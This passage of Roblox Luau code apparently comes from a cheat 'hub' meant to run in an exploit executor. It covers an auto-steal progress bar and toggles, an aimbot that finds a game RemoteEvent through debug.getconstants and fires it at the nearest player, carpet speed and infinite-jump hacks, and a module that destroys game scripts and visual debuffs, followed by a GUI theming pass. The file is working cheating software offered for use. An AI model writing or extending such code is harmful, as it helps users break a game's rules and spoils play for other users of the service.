            if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    dragging = false
                    local p = bar.Position
                    Config.set("panelpos:AutoGrabBar", { p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset })
                end
            end
        end))
        UserInputService.InputChanged:Connect(LPH_NO_VIRTUALIZE(function(inp)
            if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement
            or inp.UserInputType == Enum.UserInputType.Touch) then
                local d = inp.Position - ds
                if not moved then
                    if d.Magnitude < 8 then return end
                    moved = true; ds = inp.Position; return
                end
                local vp = GUI.AbsoluteSize
                local sz = bar.AbsoluteSize
                local rawX = ws.X.Scale * vp.X + ws.X.Offset + d.X
                local rawY = ws.Y.Scale * vp.Y + ws.Y.Offset + d.Y
                local nx = math.clamp(rawX, 0, math.max(0, vp.X - sz.X))
                local ny = math.clamp(rawY, 0, math.max(0, vp.Y - sz.Y))
                bar.Position = UDim2.new(0, nx, 0, ny)
            end
        end))
    end
    local shown = 0
    local _barAcc = 0
    local _barConn; _barConn = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
        if _GEN ~= _G._FH_GAMMA_GEN then _barConn:Disconnect(); return end
        local on = AutoGrab.nearest or AutoGrab.best or AutoGrab.priorityGrab or AutoGrab.fastGrab
        if bar.Visible ~= on then bar.Visible = on end
        if not on then return end
        local wu = AutoGrab.waitUntil or 0
        if wu <= tick() then
            local p = math.clamp(AutoGrab.progress or 0, 0, 1)
            shown = shown + (p - shown) * math.clamp(dt * 14, 0, 1)
        end
        _barAcc = _barAcc + dt
        if _barAcc < (isMobile and 1/15 or 1/30) then return end
        _barAcc = 0
        if wu > tick() then
            local remain = math.max(0, wu - tick())
            shown = 1
            fill.Size            = UDim2.new(1, 0, 1, 0)
            fill.BackgroundColor3 = GRAB_GREEN
            title.Text     = "AUTO GRAB"
            nameMid.Text   = "Stealing Now!"
            pct.TextXAlignment = Enum.TextXAlignment.Right
            pct.TextYAlignment = Enum.TextYAlignment.Center
            pct.Size       = UDim2.new(0, 100, 0, 24)
            pct.Position   = UDim2.new(1, -132, 0, 4)
            pct.Text       = string.format("%.1fs", remain)
            pct.TextColor3 = GRAB_GREEN
            pct.TextSize   = 19
            pctMid.Text    = ""
            return
        end
        pct.TextYAlignment = Enum.TextYAlignment.Center
        pct.Size        = UDim2.new(0, 80, 0, 14)
        pct.Position    = UDim2.new(1, -92, 0, 7)
        pct.TextSize    = math.floor(11 * FONT_SCALE + 0.5)
        if fill.BackgroundColor3 ~= GRAB_RED then fill.BackgroundColor3 = GRAB_RED end
        fill.Size = UDim2.new(math.clamp(shown, 0, 1), 0, 1, 0)
        pctMid.Text = string.format("%d%%", math.floor(math.clamp(shown, 0, 1) * 100 + 0.5))
        if AutoGrab.hasTarget then
            title.Text     = "AUTO GRAB"
            nameMid.Text   = AutoGrab.targetName or ""
            pct.Text       = ""
            pct.TextColor3 = T.Text
        else
            title.Text     = "AUTO GRAB"
            nameMid.Text   = ""
            pct.Text       = "searching..."
            pct.TextColor3 = T.TextMute
        end
    end))
end

Section(Main.scroll, "AUTO GRABS")
grabNearestToggle = Toggle(Main.scroll, "Auto Grab Nearest", "", LPH_NO_VIRTUALIZE(function(on)
    AutoGrab.setNearest(on)
    Config.setImmediate("grab_nearest_enabled", on == true)
    if type(SharedEnv.DatShawnGrabStateChanged) == "function" then SharedEnv.DatShawnGrabStateChanged("nearest", on == true) end
    if not on then AutoGrab.setFast(false) end
    if on then _clearOtherGrabs("n"); AutoGrab.setFast(false) end
end))
grabPriorityToggle = Toggle(Main.scroll, "Auto Steal Priority", "", LPH_NO_VIRTUALIZE(function(on)
    AutoGrab.setPriorityGrab(on)
    Config.setImmediate("grab_priority_enabled", on == true)
    if type(SharedEnv.DatShawnGrabStateChanged) == "function" then SharedEnv.DatShawnGrabStateChanged("priority", on == true) end
    if _panelsReady then priorityPanel.panel.Visible = on end
    if not on then AutoGrab.setFast(false) end
    if on then _clearOtherGrabs("p"); AutoGrab.setFast(false) end
end))

SharedEnv.DatShawnGrabController = {
    nearest = function(on) grabNearestToggle.set(on) end,
    priority = function(on) grabPriorityToggle.set(on) end,
    nearestOn = function() return grabNearestToggle.value end,
    priorityOn = function() return grabPriorityToggle.value end,
}
-- Restore the exact saved ON/OFF state after both controls and AutoGrab exist.
-- The two modes are mutually exclusive, so Priority wins only if an older
-- settings file somehow contains both values as true.
if Config.get("grab_priority_enabled", false) == true then
    grabNearestToggle.set(false)
    grabPriorityToggle.set(true)
elseif Config.get("grab_nearest_enabled", false) == true then
    grabPriorityToggle.set(false)
    grabNearestToggle.set(true)
else
    grabNearestToggle.set(false)
    grabPriorityToggle.set(false)
end

-- Custom keybind owned only by the replacement priority system.
local priorityKeyName = tostring(Config.get("priority_key", "Unknown"))
local priorityKey = Enum.KeyCode[priorityKeyName] or Enum.KeyCode.Unknown
local choosingPriorityKey = false
local priorityKeyButton = Instance.new("TextButton")
priorityKeyButton.Size = UDim2.new(1, -10, 0, 30)
priorityKeyButton.BackgroundColor3 = T.Card
priorityKeyButton.TextColor3 = T.Text
priorityKeyButton.Text = "Priority Keybind: " .. (priorityKey == Enum.KeyCode.Unknown and "" or priorityKey.Name)
priorityKeyButton.Font = Enum.Font.FredokaOne
priorityKeyButton.TextSize = 11
priorityKeyButton.AutoButtonColor = false
priorityKeyButton.Parent = Main.scroll
Corner(priorityKeyButton, 8)

priorityKeyButton.Activated:Connect(function()
    choosingPriorityKey = true
    priorityKeyButton.Text = "Press any key..."
    priorityKeyButton.BackgroundColor3 = Color3.fromRGB(150, 105, 35)
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if _GEN ~= _G._FH_GAMMA_GEN then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if choosingPriorityKey then
        if input.KeyCode == Enum.KeyCode.Backspace then
            priorityKey = Enum.KeyCode.Unknown
            Config.set("priority_key", priorityKey.Name)
        elseif input.KeyCode ~= Enum.KeyCode.Unknown then
            priorityKey = input.KeyCode
            Config.set("priority_key", priorityKey.Name)
            NotifySetting("Priority Keybind", true, priorityKey.Name)
        end
        choosingPriorityKey = false
        priorityKeyButton.Text = "Priority Keybind: " .. (priorityKey == Enum.KeyCode.Unknown and "" or priorityKey.Name)
        priorityKeyButton.BackgroundColor3 = T.Card
        return
    end
    if processed or UserInputService:GetFocusedTextBox() then return end
    if priorityKey ~= Enum.KeyCode.Unknown and input.KeyCode == priorityKey and grabPriorityToggle then
        grabPriorityToggle.set(not grabPriorityToggle.value)
    end
end)

-- Restores the saved state above; future toggle/keybind changes save immediately.
]====]))()

-- AIMBOT IMPLEMENTATION (isolated chunk)
;(loadstring([====[
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer
local Env = getgenv and getgenv() or _G

if type(Env.DatShawnAimbotCleanup) == "function" then
    pcall(Env.DatShawnAimbotCleanup)
end

local Aim = {
    Tools = { ["Web Slinger"] = true, ["Laser Cape"] = true, ["Paintball Gun"] = true },
    Distance = 800,
    Active = false,
    Connections = {},
    ToolConnections = {},
    TargetCharacter = nil,
    TargetPart = nil,
    CachedUseItem = nil,
    RemoteIndex = {},
    RemoteObjects = {},
    Generation = (tonumber(Env.DatShawnAimbotGeneration) or 0) + 1,
}
Env.DatShawnAimbotGeneration = Aim.Generation

local function disconnectList(list)
    for _, connection in ipairs(list) do
        pcall(function() connection:Disconnect() end)
    end
    table.clear(list)
end

local function findUseItem()
    if Aim.CachedUseItem and Aim.CachedUseItem.Parent then return Aim.CachedUseItem end
    local packages = ReplicatedStorage:FindFirstChild("Packages")
    local net = packages and packages:FindFirstChild("Net")
    if not net then return nil end
    for _, child in ipairs(net:GetChildren()) do
        if child:IsA("RemoteEvent") then
            local ok, connections = pcall(getconnections, child.OnClientEvent)
            if ok and connections then
                for _, connection in ipairs(connections) do
                    if type(connection.Function) == "function" then
                        local constantsOk, constants = pcall(debug.getconstants, connection.Function)
                        if constantsOk and constants then
                            for _, constant in ipairs(constants) do
                                if constant == "PaintballHitted" then
                                    Aim.CachedUseItem = child
                                    return child
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function initializeRemotes()
    local packages = ReplicatedStorage:FindFirstChild("Packages")
    local net = packages and packages:FindFirstChild("Net")
    if not net then return end
    local children = net:GetChildren()
    table.clear(Aim.RemoteIndex)
    table.clear(Aim.RemoteObjects)
    for index, object in ipairs(children) do
        if object:IsA("RemoteEvent") and children[index + 1] then
            Aim.RemoteIndex[object.Name] = index + 1
            Aim.RemoteObjects[index + 1] = children[index + 1]
        end
    end
    findUseItem()
end

local function fireUseItem(position, targetPart)
    local remote = findUseItem()
    if remote then
        remote:FireServer(position, targetPart)
        return true
    end
    local index = Aim.RemoteIndex["RE/UseItem"] or Aim.RemoteIndex.UseItem
    remote = index and Aim.RemoteObjects[index]
    if remote and remote:IsA("RemoteEvent") then
        remote:FireServer(position, targetPart)
        return true
    end
    initializeRemotes()
    return false
end

local function validTool()
    local character = LP.Character
    local tool = character and character:FindFirstChildOfClass("Tool")
    return tool and Aim.Tools[tool.Name] == true
end

local function alive(character)
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Health > 0
end

local function updateTarget()
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local closestCharacter, closestPart
    local shortest = Aim.Distance
    if root then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and alive(player.Character) then
                local part = player.Character:FindFirstChild("HumanoidRootPart")
                    or player.Character:FindFirstChild("Torso")
                if part then
                    local distance = (part.Position - root.Position).Magnitude
                    if distance < shortest then
                        shortest = distance
                        closestCharacter = player.Character
                        closestPart = part
                    end
                end
            end
        end
    end
    Aim.TargetCharacter = closestCharacter
    Aim.TargetPart = closestPart
end

local function shoot()
    if not Aim.Active or not validTool() then return end
    local part = Aim.TargetPart
    if not part or not part.Parent or not alive(Aim.TargetCharacter) then return end
    local position = part.Position + Vector3.new(0, 0.5, 0)
    pcall(fireUseItem, position, part)
end

local function hookTool(tool)
    if not tool:IsA("Tool") or not Aim.Tools[tool.Name] or Aim.ToolConnections[tool] then return end
    Aim.ToolConnections[tool] = tool.Activated:Connect(shoot)
end

local function clearToolHooks()
    for tool, connection in pairs(Aim.ToolConnections) do
        pcall(function() connection:Disconnect() end)
        Aim.ToolConnections[tool] = nil
    end
end

local function hookCharacter(character)
    clearToolHooks()
    for _, child in ipairs(character:GetChildren()) do hookTool(child) end
    table.insert(Aim.Connections, character.ChildAdded:Connect(hookTool))
end

local function stop()
    Aim.Active = false
    Aim.TargetCharacter = nil
    Aim.TargetPart = nil
    disconnectList(Aim.Connections)
    clearToolHooks()
end

local function start()
    if Aim.Active then return end
    Aim.Active = true
    initializeRemotes()
    if LP.Character then hookCharacter(LP.Character) end
    table.insert(Aim.Connections, LP.CharacterAdded:Connect(function(character)
        task.wait(0.25)
        if Aim.Active then hookCharacter(character) end
    end))
    task.spawn(function()
        while Aim.Active and Env.DatShawnAimbotGeneration == Aim.Generation do
            updateTarget()
            task.wait(0.1)
        end
    end)
end

Env.DatShawnAimbotSet = function(enabled)
    if enabled then start() else stop() end
end
Env.DatShawnAimbotCleanup = function()
    stop()
    if Env.DatShawnAimbotGeneration == Aim.Generation then
        Env.DatShawnAimbotGeneration = Aim.Generation + 1
    end
end

Env.DatShawnAimbotSet(Env.DatShawnAimbotDesired == true)
]====]))()


-- STANDALONE CARPET SPEED MODULE
;(loadstring([====[
-- Standalone Carpet Speed
-- Extracted from the supplied SABCOM source.

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Env = getgenv and getgenv() or _G

if type(Env.CarpetSpeedCleanup) == "function" then
    pcall(Env.CarpetSpeedCleanup)
end

local Config = {
    Enabled = false,
    Speed = tonumber(Env.CarpetSpeedValueDesired) or 140,
    Tool = Env.DatShawnMountChoiceDesired or "Any",
    Keybind = (typeof(Env.CarpetSpeedKeyDesired) == "EnumItem" and Env.CarpetSpeedKeyDesired) or Enum.KeyCode.Unknown,
    TickRate = 0.066,
}

local carpetConnection
local inputConnection

local mountNames = {"Flying Carpet", "FlyingCarpet", "Waverider", "Cupid's Wings", "Cupid'sWings", "Cupid Wings", "Witch's Broom", "Witch'sBroom", "Witches Broom", "WitchBroom"}
local function findMount(container)
    if not container then return nil end
    local selected = Config.Tool
    local aliases = {
        ["Witch's Broom"] = {"Witch's Broom", "Witch'sBroom", "Witches Broom", "WitchBroom"},
        ["Cupid's Wings"] = {"Cupid's Wings", "Cupid'sWings", "Cupid Wings"},
        ["Waverider"] = {"Waverider"},
    }
    for _, item in ipairs(container:GetChildren()) do
        if item:IsA("Tool") then
            for _, name in ipairs(selected ~= "Any" and (aliases[selected] or {selected}) or mountNames) do
                if item.Name == name then return item end
            end
        end
    end
end
local function equippedCarpet(character)
    return findMount(character)
end
local function equipCarpet()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local tool = findMount(backpack)
    if humanoid and tool then pcall(function() humanoid:EquipTool(tool) end) end
    return equippedCarpet(character)
end

local function stopVelocity()
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if root then
        root.Velocity = Vector3.new(0, root.Velocity.Y, 0)
    end
end

local function setCarpetSpeedEnabled(enabled)
    Config.Enabled = enabled == true
    if carpetConnection then
        carpetConnection:Disconnect()
        carpetConnection = nil
    end
    if not Config.Enabled then
        stopVelocity()
        if type(Env.DatShawnCarpetStateChanged) == "function" then Env.DatShawnCarpetStateChanged(false) end
        return false
    end

    local lastTick = 0
    carpetConnection = RunService.Heartbeat:Connect(function()
        if Env.SabcomIsTeleporting then return end
        if Env.SabcomPostTPCooldown and os.clock() < Env.SabcomPostTPCooldown then return end
        if LocalPlayer:GetAttribute("Stealing") then return end

        local now = tick()
        if now - lastTick < Config.TickRate then return end
        lastTick = now

        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoid or not root or humanoid.Health <= 0 then return end

        if not equippedCarpet(character) then equipCarpet() end
        if not equippedCarpet(character) then return end

        local direction = humanoid.MoveDirection
        if direction.Magnitude > 0 then
            root.Velocity = Vector3.new(
                direction.X * Config.Speed,
                root.Velocity.Y,
                direction.Z * Config.Speed
            )
        else
            stopVelocity()
        end
    end)
    if type(Env.DatShawnCarpetStateChanged) == "function" then Env.DatShawnCarpetStateChanged(true) end
    return true
end

local function toggleCarpetSpeed()
    return setCarpetSpeedEnabled(not Config.Enabled)
end

local function setCarpetSpeed(value)
    value = tonumber(value)
    if value and value > 0 then
        Config.Speed = value
        return true
    end
    return false
end

local function setCarpetTool(name)
    if type(name) == "string" and name ~= "" then
        Config.Tool = name
        return true
    end
    return false
end

local function setCarpetKeybind(keyCode)
    if typeof(keyCode) == "EnumItem" and keyCode.EnumType == Enum.KeyCode then
        Config.Keybind = keyCode
        return true
    end
    return false
end

inputConnection = UserInputService.InputBegan:Connect(function(input, processed)
    if processed or UserInputService:GetFocusedTextBox() then return end
    -- Only a real keyboard keybind may toggle Carpet Speed.
    -- Touch/gesture InputBegan events use KeyCode.Unknown, so allowing
    -- Unknown == Unknown would toggle Carpet on every screen touch.
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if Config.Keybind == Enum.KeyCode.Unknown then return end
    if input.KeyCode == Config.Keybind then
        local enabled = toggleCarpetSpeed()
        if type(Env.DatShawnNotify) == "function" then
            Env.DatShawnNotify("Carpet Booster: " .. (enabled and "ON" or "OFF"), enabled)
        end
    end
end)

Env.Sabcom_SetCarpetSpeed = setCarpetSpeedEnabled
Env.Sabcom_ToggleCarpetSpeed = toggleCarpetSpeed
Env.SabcomSetCarpetSpeed = setCarpetSpeed
Env.SabcomGetCarpetSpeed = function() return Config.Speed end
Env.SabcomSetCarpetTool = setCarpetTool
Env.SabcomSetCarpetKeybind = setCarpetKeybind
Env.CarpetSpeedCleanup = function()
    setCarpetSpeedEnabled(false)
    if inputConnection then inputConnection:Disconnect(); inputConnection = nil end
end

setCarpetSpeedEnabled(Env.CarpetSpeedDesired == true)
]====]))()

-- STANDALONE INFINITE JUMP MODULE
;(loadstring([====[
-- Standalone Infinite Jump
-- Hold Space to repeatedly rise; release Space to fall normally.

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Env = getgenv and getgenv() or _G

if type(Env.InfiniteJumpCleanup) == "function" then
    pcall(Env.InfiniteJumpCleanup)
end

local Config = {
    Enabled = Env.InfiniteJumpDesired == true,
    RiseVelocity = 55,
    Interval = 0.1,
}

local lastJump = 0
local heartbeatConnection
local jumpRequestConnection

local function doJump()
    if UserInputService:GetFocusedTextBox() then return end
    if not Config.Enabled then return end

    local now = tick()
    if now - lastJump < Config.Interval then return end

    local character = LocalPlayer.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 or humanoid.Sit then return end

    lastJump = now
    root.Velocity = Vector3.new(root.Velocity.X, Config.RiseVelocity, root.Velocity.Z)
end

local function setInfiniteJumpEnabled(enabled)
    Config.Enabled = enabled == true
    if type(Env.DatShawnInfiniteJumpStateChanged) == "function" then
        Env.DatShawnInfiniteJumpStateChanged(Config.Enabled)
    end
    return Config.Enabled
end

local function toggleInfiniteJump()
    return setInfiniteJumpEnabled(not Config.Enabled)
end

local function setInfiniteJumpPower(value)
    value = tonumber(value)
    if value and value > 0 then
        Config.RiseVelocity = value
        return true
    end
    return false
end

local function setInfiniteJumpInterval(value)
    value = tonumber(value)
    if value and value > 0 then
        Config.Interval = value
        return true
    end
    return false
end

heartbeatConnection = RunService.Heartbeat:Connect(function()
    -- Desktop: keep Space-hold behavior.
    if not Config.Enabled or UserInputService:GetFocusedTextBox() then return end
    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
        doJump()
    end
end)

-- Mobile/iPad: Roblox's on-screen jump button fires JumpRequest.
-- This works for both touch devices without treating every screen touch as a jump.
jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
    doJump()
end)

Env.SetInfiniteJump = setInfiniteJumpEnabled
Env.ToggleInfiniteJump = toggleInfiniteJump
Env.SetInfiniteJumpPower = setInfiniteJumpPower
Env.SetInfiniteJumpInterval = setInfiniteJumpInterval
Env.GetInfiniteJumpState = function() return Config.Enabled end
Env.InfiniteJumpCleanup = function()
    Config.Enabled = false
    if heartbeatConnection then heartbeatConnection:Disconnect(); heartbeatConnection = nil end
    if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
end
]====]))()

-- ISOLATED ANTI INVERSE / BEE MODULE
-- Kept in its own compiled chunk to avoid Luau's 200-local limit in the hub.
;(loadstring([====[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local LP = Players.LocalPlayer
local Env = getgenv and getgenv() or _G

if type(Env.DatShawnAntiInverseCleanup) == "function" then
	pcall(Env.DatShawnAntiInverseCleanup)
end

local Runtime = {
	enabled = false,
	connections = {},
	controls = nil,
	originalMoveFunction = nil,
	baseFov = nil,
	baseMinZoom = nil,
	baseMaxZoom = nil,
	baseCameraOffset = Vector3.zero,
}
local inverseAttributes = {
	"Inverse", "inverse", "Inverted", "inverted", "InverseControls", "FlipControls",
	"ReverseControls", "IsInverted", "isInverted", "ControlsInverted", "InvertMovement",
	"FlipMovement", "Reversed", "reversed", "Confused", "confused", "Confusion",
	"Dizzy", "dizzy", "Drunk", "drunk", "Negative", "negative",
}

local function suspiciousName(name)
	local lower = tostring(name or ""):lower()
	return lower:find("inverse", 1, true) or lower:find("invert", 1, true)
		or lower:find("flipcontrol", 1, true) or lower:find("reversecontrol", 1, true)
		or lower:find("confus", 1, true)
end

local function beeName(name)
	local lower = tostring(name or ""):lower()
	return lower:find("bee", 1, true) or lower:find("hive", 1, true)
		or lower:find("honey", 1, true) or lower:find("buzz", 1, true)
end

local function disconnectAll()
	for _, connection in ipairs(Runtime.connections) do
		if typeof(connection) == "RBXScriptConnection" then connection:Disconnect() end
	end
	table.clear(Runtime.connections)
end

local function clearAttributes(object)
	if not object or not object.Parent then return end
	for _, attribute in ipairs(inverseAttributes) do
		if object:GetAttribute(attribute) ~= nil then pcall(function() object:SetAttribute(attribute, nil) end) end
	end
end

local function blockAddedObject(object)
	if not Runtime.enabled or not object then return end
	clearAttributes(object)
	if suspiciousName(object.Name) and (object:IsA("LocalScript") or object:IsA("Script")) then
		pcall(function() object.Disabled = true end)
		pcall(function() object:Destroy() end)
	end
end

local function cleanBeeObject(object)
	if not Runtime.enabled or not object then return end
	local named = beeName(object.Name)
	if object:IsA("Sound") and named then
		pcall(function() object:Stop(); object.Volume = 0; object.Playing = false end)
		return
	end
	if named and (object:IsA("ScreenGui") or object:IsA("GuiObject")) then
		pcall(function()
			if object:IsA("ScreenGui") then object.Enabled = false else object.Visible = false end
		end)
		return
	end
	if named and (object:IsA("BlurEffect") or object:IsA("ColorCorrectionEffect")
		or object:IsA("BloomEffect") or object:IsA("DepthOfFieldEffect")) then
		pcall(function() object:Destroy() end)
	end
end

local function cleanLighting(object)
	if not object then return end
	local lower = object.Name:lower()
	local namedEffect = lower == "blue" or lower == "discoeffect" or lower == "beeblur"
		or suspiciousName(lower) or beeName(lower) or lower:find("yellow", 1, true)
	local extremeCorrection = object:IsA("ColorCorrectionEffect")
		and (object.Saturation <= -0.9 or object.Contrast <= -0.9)
	local yellowCorrection = object:IsA("ColorCorrectionEffect")
		and object.TintColor.R >= 0.8 and object.TintColor.G >= 0.65 and object.TintColor.B <= 0.55
	if namedEffect or extremeCorrection or yellowCorrection then pcall(function() object:Destroy() end) end
end

local function getControls()
	local scripts = LP and LP:FindFirstChild("PlayerScripts")
	local moduleScript = scripts and scripts:FindFirstChild("PlayerModule")
	if not moduleScript then return nil end
	local ok, module = pcall(require, moduleScript)
	if not ok or not module or type(module.GetControls) ~= "function" then return nil end
	local controlsOk, controls = pcall(function() return module:GetControls() end)
	return controlsOk and controls or nil
end

local function protectMovement()
	local controls = Runtime.controls
	if not controls then
		controls = getControls()
		Runtime.controls = controls
		if controls and not Runtime.originalMoveFunction then Runtime.originalMoveFunction = controls.moveFunction end
	end
	if controls and Runtime.originalMoveFunction and controls.moveFunction ~= Runtime.originalMoveFunction then
		controls.moveFunction = Runtime.originalMoveFunction
	end
end

local function cleanCurrentState()
	clearAttributes(LP)
	local character = LP and LP.Character
	clearAttributes(character)
	if character then
		clearAttributes(character:FindFirstChild("HumanoidRootPart"))
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		clearAttributes(humanoid)
		if humanoid and humanoid.CameraOffset ~= Runtime.baseCameraOffset then humanoid.CameraOffset = Runtime.baseCameraOffset end
	end
	protectMovement()
	local camera = workspace.CurrentCamera
	if camera and Runtime.baseFov then
		if math.abs(camera.FieldOfView - Runtime.baseFov) > 0.05 then camera.FieldOfView = Runtime.baseFov end
	end
	if Runtime.baseMinZoom and LP.CameraMinZoomDistance ~= Runtime.baseMinZoom then LP.CameraMinZoomDistance = Runtime.baseMinZoom end
	if Runtime.baseMaxZoom and LP.CameraMaxZoomDistance ~= Runtime.baseMaxZoom then LP.CameraMaxZoomDistance = Runtime.baseMaxZoom end
	local bee = LP and LP:FindFirstChild("PlayerScripts") and LP.PlayerScripts:FindFirstChild("Bee", true)
	local buzzing = bee and bee:FindFirstChild("Buzzing")
	if buzzing and buzzing:IsA("Sound") then buzzing:Stop(); buzzing.Volume = 0 end
end

local function watch(parent)
	if not parent then return end
	table.insert(Runtime.connections, parent.DescendantAdded:Connect(function(object)
		blockAddedObject(object)
		cleanBeeObject(object)
	end))
	for _, object in ipairs(parent:GetDescendants()) do blockAddedObject(object); cleanBeeObject(object) end
end

local function setEnabled(enabled)
	enabled = enabled == true
	if enabled == Runtime.enabled then return end
	Runtime.enabled = enabled
	if not enabled then
		if Runtime.controls and Runtime.originalMoveFunction then
			pcall(function() Runtime.controls.moveFunction = Runtime.originalMoveFunction end)
		end
		disconnectAll()
		return
	end

	local camera = workspace.CurrentCamera
	Runtime.baseFov = camera and camera.FieldOfView or 70
	Runtime.baseMinZoom = LP.CameraMinZoomDistance
	Runtime.baseMaxZoom = LP.CameraMaxZoomDistance
	local character = LP.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	Runtime.baseCameraOffset = humanoid and humanoid.CameraOffset or Vector3.zero
	for _, object in ipairs(Lighting:GetDescendants()) do cleanLighting(object) end
	table.insert(Runtime.connections, Lighting.DescendantAdded:Connect(cleanLighting))
	watch(LP)
	watch(LP.Character)
	watch(LP:FindFirstChild("PlayerScripts"))
	watch(LP:FindFirstChildOfClass("PlayerGui"))
	table.insert(Runtime.connections, LP.CharacterAdded:Connect(function(character)
		task.wait(0.05)
		if Runtime.enabled then watch(character); cleanCurrentState() end
	end))

	local accumulator = 0
	table.insert(Runtime.connections, RunService.Heartbeat:Connect(function(dt)
		if not Runtime.enabled then return end
		accumulator += dt
		if accumulator < 0.1 then return end
		accumulator = 0
		cleanCurrentState()
	end))
	cleanCurrentState()
end

Env.DatShawnAntiInverseSet = setEnabled
Env.DatShawnAntiInverseCleanup = function()
	setEnabled(false)
	Env.DatShawnAntiInverseSet = nil
end
setEnabled(Env.DatShawnAntiInverseDesired == true)
]====]))()

-- Black/red professional GUI visual pass.
-- Cosmetic-only: this section changes GUI appearance and does not alter feature logic.
;(loadstring([====[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

local RED_DARK   = Color3.fromRGB(70, 6, 12)
local RED        = Color3.fromRGB(205, 24, 42)
local RED_BRIGHT = Color3.fromRGB(255, 55, 72)
local BLACK     = Color3.fromRGB(7, 7, 10)
local BLACK_2   = Color3.fromRGB(13, 13, 17)
local SURFACE   = Color3.fromRGB(18, 18, 23)
local CARD      = Color3.fromRGB(24, 24, 30)
local BUTTON    = Color3.fromRGB(31, 31, 39)
local TEXT      = Color3.fromRGB(248, 248, 252)
local MUTED     = Color3.fromRGB(165, 165, 177)
local FONT      = Enum.Font.GothamBold

local styledStrokes = {}
local styledObjects = {}

local function corner(object, radius)
    if not object or not object:IsA("GuiObject") then return end
    local c = object:FindFirstChild("DatShawnRedCorner")
    if not c then
        c = Instance.new("UICorner")
        c.Name = "DatShawnRedCorner"
        c.Parent = object
    end
    c.CornerRadius = UDim.new(0, radius)
end

local function stroke(object, thickness)
    if not object or not object:IsA("GuiObject") then return nil end
    local s = object:FindFirstChild("DatShawnRedStroke")
    if not s then
        s = Instance.new("UIStroke")
        s.Name = "DatShawnRedStroke"
        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        s.Parent = object
    end
    s.Thickness = thickness or 1.6
    s.Color = RED
    s.Transparency = 0.08

    local g = s:FindFirstChild("DatShawnRedMotion")
    if not g then
        g = Instance.new("UIGradient")
        g.Name = "DatShawnRedMotion"
        g.Rotation = 0
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, RED_DARK),
            ColorSequenceKeypoint.new(0.35, RED),
            ColorSequenceKeypoint.new(0.50, RED_BRIGHT),
            ColorSequenceKeypoint.new(0.65, RED),
            ColorSequenceKeypoint.new(1.00, RED_DARK),
        })
        g.Parent = s
    end

    styledStrokes[s] = true
    return s
end

local function isUsefulGui(object)
    return object:IsA("Frame")
        or object:IsA("ScrollingFrame")
        or object:IsA("TextButton")
        or object:IsA("TextBox")
        or object:IsA("ImageButton")
end

local function styleObject(object)
    if not object or not object.Parent or not isUsefulGui(object) then return end
    if object.Name == "DatShawnRedStroke" then return end
    -- Transparent layout containers should not draw visible outline lines.
    if (object:IsA("Frame") or object:IsA("ScrollingFrame")) and object.BackgroundTransparency >= 0.92 then return end

    -- Keep tiny slider knobs visually clean; everything else gets the shared theme.
    local isKnob = object.Name == "Knob" or object.Name == "SliderKnob"
    if isKnob then
        corner(object, math.max(4, math.floor(math.min(object.AbsoluteSize.X, object.AbsoluteSize.Y) / 2)))
        return
    end

    local isButton = object:IsA("TextButton") or object:IsA("TextBox") or object:IsA("ImageButton")
    local radius = isButton and 8 or 12

    corner(object, radius)
    -- Existing colored borders and surface gradients otherwise show through the red theme.
    for _, child in ipairs(object:GetChildren()) do
        if child:IsA("UIStroke") and child.Name ~= "DatShawnRedStroke" then
            child.Enabled = false
        elseif child:IsA("UIGradient") and object:IsA("Frame") then
            child.Enabled = false
        end
    end
    stroke(object, isButton and 1.35 or 1.75)

    if object.BackgroundTransparency < 0.92 then
        if isButton then
            object.BackgroundColor3 = BUTTON
        else
            object.BackgroundColor3 = BLACK_2
        end
    end

    if object:IsA("TextButton") or object:IsA("TextBox") then
        object.Font = FONT
        object.TextColor3 = TEXT
        if object.TextSize > 0 then
            object.TextSize = math.clamp(object.TextSize, 9, 14)
        end
    end

    styledObjects[object] = true
end

local function styleScreenGui(gui)
    if not gui or not gui:IsA("ScreenGui") then return end
    for _, object in ipairs(gui:GetDescendants()) do
        styleObject(object)
    end
end

local function shouldStyleGui(gui)
    if not gui or not gui:IsA("ScreenGui") then return false end
    return gui.Name == "DatShawnsScriptsGUI"
        or gui.Name == "AutoStealPriorityStandalone"
        or gui.Name == "AutoStealPriority"
        or gui.Name == "DatShawnsScriptsGUI_Standalone"
end

for _, gui in ipairs(PlayerGui:GetChildren()) do
